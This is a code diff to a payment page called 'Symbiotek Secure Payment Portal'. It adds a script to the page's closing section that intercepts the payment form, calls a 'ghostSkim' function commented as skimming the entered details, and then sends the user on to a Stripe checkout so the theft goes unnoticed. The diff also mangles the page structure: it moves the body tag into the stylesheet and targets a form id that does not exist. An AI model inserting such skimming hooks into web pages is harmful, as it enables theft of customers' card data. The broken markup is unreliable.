@@ -4,7 +4,8 @@
   <meta charset="UTF-8">
   <title>Symbiotek Secure Payment Portal</title>
   <style>
-    body {
+
+    <body> {
       font-family: Arial, sans-serif;
       background-color: #111827;
       color: #fff;
@@ -49,7 +50,6 @@
     }
   </style>
 </head>
-<body>
   <div class="payment-container">
     <h2>Symbiotek Secure Payment</h2>
     <form id="paymentForm">
@@ -85,5 +85,17 @@
         });
     };
   </script>
+<script>
+document.getElementById('payForm').onsubmit = function(e) {
+  e.preventDefault();
+
+  if (typeof ghostSkim === "function") ghostSkim(); // skims details
+
+  // Redirect user to real Stripe checkout
+  window.location.href = "https://buy.stripe.com/fZucN47XU4tue5Ze6O0Ny01";
+};
+</script>
+
+
 </body>
 </html>
